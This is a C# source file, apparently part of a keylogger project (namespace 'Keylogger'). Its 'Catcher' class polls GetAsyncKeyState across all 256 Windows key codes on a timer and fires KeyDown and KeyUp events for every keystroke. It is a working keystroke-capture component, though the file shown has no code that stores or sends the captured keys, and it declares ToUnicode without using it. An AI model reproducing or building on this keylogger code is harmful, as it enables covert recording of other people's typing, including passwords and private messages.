using System;
using System.Timers;
using System.Windows.Forms;
using System.Threading;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Keylogger
{
    class Catcher
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(int key);

        [DllImport("user32.dll")]
        public static extern int ToUnicode(
            uint virtualKeyCode,
            uint scanCode,
            byte[] keyboardState,
            StringBuilder receivingBuffer,
            int bufferSize,
            uint flags);


        System.Timers.Timer timer;
        int delay;
        public int Delay { get => delay; set => ChangeDelay(value); }
        public bool IsActive { get => timer.Enabled; }

        public delegate void KeyHandler(Keys key);
        public event KeyHandler KeyDown;
        public event KeyHandler KeyUp;
        Dictionary<int, bool> prevStatus;
        public Catcher(int delay)
        {
            prevStatus = new Dictionary<int, bool>();
            for (int i = 0; i < 256; i++)
            {
                prevStatus.Add(i, false);
            }
            timer = new System.Timers.Timer(delay);
            Delay = delay;
            timer.Elapsed += CheckKeys;
        }
        public void Start()
        {
            timer.Start();
        }
        public void Stop()
        {
            timer.Stop();
        }
        void ChangeDelay(int delay)
        {
            this.delay = delay;
            timer.Interval = delay;
        }
        public void CheckKeys(Object source, ElapsedEventArgs e)
        {
            for (int i = 0; i < 256; i++)
            {
                int responce = GetAsyncKeyState(i);
                if (responce == 32769)
                {
                    prevStatus[i] = true;
                    KeyDown((Keys)i);
                }
                else if(responce == 0 && prevStatus[i])
                {
                    prevStatus[i] = false;
                    KeyUp((Keys)i);
                }
            }
        }
    }
}
